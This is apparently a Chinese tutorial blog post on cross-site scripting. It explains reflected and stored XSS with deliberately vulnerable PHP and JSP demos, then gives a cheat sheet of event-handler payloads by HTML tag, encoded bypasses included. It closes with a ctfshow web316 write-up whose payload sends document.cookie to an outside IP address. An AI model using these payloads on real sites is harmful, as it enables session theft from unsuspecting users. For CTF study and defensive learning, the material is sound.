+<li>劫持流量实现恶意跳转。这个很简单，就是在网页中想办法插入一句像这样的语句：<a target="_blank" rel="noopener" href="http://www.baidu.com那么所访问的网站就会被跳转到百度的首页.早在2011年新浪就曾爆出过严重的xss漏洞,导致大量用户自动关注某个微博号并自动转发某条微博.具体各位可以自行百度./">http://www.baidu.com那么所访问的网站就会被跳转到百度的首页。早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。</a></li>
+</ol>
+<h3 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h3><p>利用XSS需要浏览器版本和内核没有过滤XSS攻击（比如用谷歌Edge火狐等打开可以成功，但是IE却会拦截）</p>
+<h2 id="0x03xss攻击"><a href="#0x03xss攻击" class="headerlink" title="0x03xss攻击"></a>0x03xss攻击</h2><p>XSS攻击分成两类，一类是来自内部的攻击，另一类则是来自外部的攻击</p>
+<p>（1）来自内部的攻击<br>  主要指的是利用程序自身的漏洞，构造跨站语句，如:dvbbs的showerror.asp存在的跨站漏洞。</p>
+<p>（2）来自外部的攻击<br>  主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。</p>
+<h2 id="0x04xss分类及介绍"><a href="#0x04xss分类及介绍" class="headerlink" title="0x04xss分类及介绍"></a>0x04xss分类及介绍</h2><h4 id="1、反射型-非持久化"><a href="#1、反射型-非持久化" class="headerlink" title="1、反射型(非持久化)"></a>1、反射型(非持久化)</h4><p>1.原理<br>  反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p>
+<p>2.攻击方式</p>
+<p>  攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞</p>
+<p>3 判断是否存在反射型xss漏洞并利用</p>
+<p>判断方法:判断有没有过滤一些特殊的字符串（比如对比输出的字符和输出的字符）,然后测试观察源代码有没有成功插入，如果可以插入那就构造payload进行注入</p>
+<p>这里简单写个demo来看看</p>
+<p>demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/xss--ctfshow/07a1746c6488d6afa192ea6f9f8771ec.png" alt="img"></p>
+<p>传入后直接就出现弹窗了,说明我们的恶意代码被解析插入网页中了，但这个demo相对简单，不能更好的理解攻击原理，我们再举个demo看看</p>
+<p>这里我就直接拿我朋友的demo来介绍了</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS 测试页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;XSS 测试页面&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;xss_test.jsp&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;message&quot;</span>&gt;输入消息:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;message&quot;</span> name=<span class="string">&quot;message&quot;</span> value=<span class="string">&quot;&lt;%= request.getParameter(&quot;</span>message<span class="string">&quot;) == null ? &quot;</span><span class="string">&quot; : request.getParameter(&quot;</span>message<span class="string">&quot;) %&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    您输入的消息是：&lt;%= request.getParameter(<span class="string">&quot;message&quot;</span>) == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : request.getParameter(<span class="string">&quot;message&quot;</span>) %&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果使用<code>Tomcat</code>来搭建一个本地服务，其中载入<code>jsp</code>漏洞代码，即可进行<code>xss</code>测试</p>
+<p>先简单的写个<code>xss_test.jsp</code>直接用来测试的</p>
+<p>我们直接在输入框中输入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现弹窗成功，我们再看看代码</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS 测试页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;XSS 测试页面&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;xss_test.jsp&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;message&quot;</span>&gt;输入消息:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;message&quot;</span> name=<span class="string">&quot;message&quot;</span> value=<span class="string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    您输入的消息是：&lt;script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>);&lt;/script&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们的恶意代码插入了刚刚的输入框，也就是被放进源码之中解析了。</p>
+<p>到这里很多人就要问了，这个payload是什么，看不懂一点，那就先介绍一下payload</p>
+<p>分析payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&lt;script&gt;</code>标签用于在HTML文档中嵌入或引用JavaScript代码。浏览器会执行<code>&lt;script&gt;</code>标签内的代码。</li>
+<li><code>alert(&#39;XSS&#39;)</code>是一个JavaScript函数调用，用于在浏览器中弹出一个警告框，显示文本内容，这里的内容就是括号里面的“XSS”。</li>
+</ul>
+<p>反射型XSS 的攻击构造与理解异常简单与轻松，难点在于各种绕过手段。</p>
+<h4 id="2-存储型"><a href="#2-存储型" class="headerlink" title="2.存储型"></a>2.存储型</h4><p><img src="/./../image/achieve/202411/xss--ctfshow/ac96e3daa1c8765aeadac3e7a94fda5f.png" alt="img"></p>
+<p>（1）原理<br>  存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击.每一个访问特定页面的用户，都会受到攻击。</p>
+<p>（2）攻击方式<br>  这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行</p>
+<p>（3）payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析一下这个代码</p>
+<ol>
+<li><strong><code>&lt;img&gt;</code> 标签</strong>：<ul>
+<li>这是一个用于插入图像的 HTML 标签。在正常情况下，<code>src</code> 属性应该包含一个指向图像文件的有效 URL。</li>
+</ul>
+</li>
+<li>**<code>src=&quot;1&quot;</code>**：<ul>
+<li>在这里，<code>src</code> 属性被设置为 <code>&quot;1&quot;</code>，这是一个无效的图像链接。当浏览器尝试加载这个图像时，它会失败，因为没有有效的图像文件可以加载。</li>
+</ul>
+</li>
+<li><strong><code>onerror</code> 属性</strong>：<ul>
+<li><code>onerror</code> 是一个事件处理程序，当图片加载失败时触发。在这种情况下，由于 <code>src</code> 指向的是一个无效的资源，<code>onerror</code> 中的 JavaScript 代码将被执行。</li>
+</ul>
+</li>
+<li>**<code>alert(/xss/)</code>**：<ul>
+<li>这是在 <code>onerror</code> 事件被触发时执行的 JavaScript 代码。<code>alert</code> 函数会弹出一个对话框，显示内容 <code>/xss/</code>。这里的 <code>/xss/</code> 是一个正则表达式字面量，在弹出的对话框中会被当作字符串处理。</li>
+</ul>
+</li>
+</ol>
+<p>注入后重新刷新发现直接回显注入的东西，说明是存储型xss</p>
+<p>其实我们下面也会提到关于标签的，这里只是其中一种</p>
+<h2 id="0x05xss常见标签语句"><a href="#0x05xss常见标签语句" class="headerlink" title="0x05xss常见标签语句"></a>0x05xss常见标签语句</h2><h3 id="0x01-标签"><a href="#0x01-标签" class="headerlink" title="0x01&lt;a&gt; 标签"></a>0x01&lt;a&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-标签"><a href="#0x02-标签" class="headerlink" title="0x02. &lt;img&gt;标签"></a>0x02. &lt;img&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;</span><br><span class="line">&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-标签"><a href="#0x03-标签" class="headerlink" title="0x03. &lt;iframe&gt;标签"></a>0x03. &lt;iframe&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-标签"><a href="#0x04-标签" class="headerlink" title="0x04. &lt;audio&gt; 标签"></a>0x04. &lt;audio&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05-标签"><a href="#0x05-标签" class="headerlink" title="0x05. &lt;video&gt;标签"></a>0x05. &lt;video&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x06-标签"><a href="#0x06-标签" class="headerlink" title="0x06. &lt;svg&gt; 标签"></a>0x06. &lt;svg&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x07-标签"><a href="#0x07-标签" class="headerlink" title="0x07. &lt;button&gt; 标签"></a>0x07. &lt;button&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=alert(1)&gt;</span><br><span class="line">&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x08-标签"><a href="#0x08-标签" class="headerlink" title="0x08. &lt;div&gt;标签"></a>0x08. &lt;div&gt;标签</h3><p>这个需要借助url编码来实现绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原代码：</span><br><span class="line">&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;</span><br><span class="line">经过url编码：</span><br><span class="line">&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x09-标签"><a href="#0x09-标签" class="headerlink" title="0x09. &lt;object&gt;标签"></a>0x09. &lt;object&gt;标签</h3><p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x10-标签"><a href="#0x10-标签" class="headerlink" title="0x10. &lt;script&gt; 标签"></a>0x10. &lt;script&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x11-标签"><a href="#0x11-标签" class="headerlink" title="0x11. &lt;p&gt; 标签"></a>0x11. &lt;p&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x12-标签"><a href="#0x12-标签" class="headerlink" title="0x12. &lt;input&gt; 标签"></a>0x12. &lt;input&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;</span><br><span class="line">&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x13-标签"><a href="#0x13-标签" class="headerlink" title="0x13. &lt;details&gt;标签"></a>0x13. &lt;details&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x14-标签"><a href="#0x14-标签" class="headerlink" title="0x14. &lt;select&gt; 标签"></a>0x14. &lt;select&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;</span><br><span class="line">&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;</span><br><span class="line">&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x15-标签"><a href="#0x15-标签" class="headerlink" title="0x15. &lt;form&gt; 标签"></a>0x15. &lt;form&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x16-标签"><a href="#0x16-标签" class="headerlink" title="0x16. &lt;body&gt; 标签"></a>0x16. &lt;body&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="反射性xss"><a href="#反射性xss" class="headerlink" title="反射性xss"></a>反射性xss</h1><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><h3 id="反射性xss-1"><a href="#反射性xss-1" class="headerlink" title="#反射性xss"></a>#反射性xss</h3><p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241119182822162.png" alt="image-20241119182822162"></p>
+<p>反射性XSS</p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>这道题的话我们输入最经典的xss语句试一下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="解析语句alert-‘XSS’"><a href="#解析语句alert-‘XSS’" class="headerlink" title="解析语句&lt;script&gt;alert(‘XSS’)&lt;&#x2F;script&gt;"></a>解析语句&lt;script&gt;alert(‘XSS’)&lt;&#x2F;script&gt;</h4><p>提供的内容是一个JavaScript脚本，其中包含了一个弹窗警告（alert），用于展示一个包含‘XSS’文字的弹窗。</p>
+<p>插入后发现有弹窗显示xss，查看源代码的时候也看到web页面源代码有xss语句，证明我们的xss语句被成功插入并解析</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241119192443556.png" alt="image-20241119192443556"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241119203014705.png" alt="image-20241119203014705"></p>
+<p>这里的话是相当于x自己了，我们拿到的是我们自己用户访问页面时候的cookie，但是这里可以看到需要admin权限</p>
+<p>所以我们需要的是管理员admin访问这个页面时候的cookie，那我们怎么去拿到admin的cookie呢?</p>
+<p>这时候就需要我们在web页面中插入xss语句来实现这个功能了</p>
+<h3 id="payload1-document-location-href"><a href="#payload1-document-location-href" class="headerlink" title="payload1:document.location.href"></a>payload1:document.location.href</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://156.238.233.87/xss.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>解析一下</p>
+<ol>
+<li><code>&lt;script&gt;</code>：这是HTML中用于嵌入JavaScript代码的标记。</li>
+<li><code>document.location.href</code> 是 JavaScript 中用于获取当前页面的 URL 地址的属性，通过 <code>document.location.href</code> 可以获取当前页面的完整 URL，包括协议、域名、端口、路径以及查询参数等信息。这个属性通常用于获取当前页面的 URL，并且可以用来跳转到其他页面。</li>
+<li>后面的<a target="_blank" rel="noopener" href="http://xxx就是远端服务器的ip地址或者xss平台的域名,这样将会导致浏览器重定向到指定url(`http//xxx/1.php?1=%60%EF%BC%89%E5%B9%B6%E4%B8%94%E9%99%84%E5%B8%A6%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E7%9A%84">http://xxx就是远端服务器的ip地址或者xss平台的域名，这样将会导致浏览器重定向到指定URL（`http://xxx/1.php?1=`）并且附带当前页面的</a> cookie 信息</li>
+</ol>
+<p>攻击的原理是，当用户浏览包含这段恶意脚本的网页时，浏览器会执行这段JavaScript代码，将用户的cookie信息发送到指定的恶意网站</p>
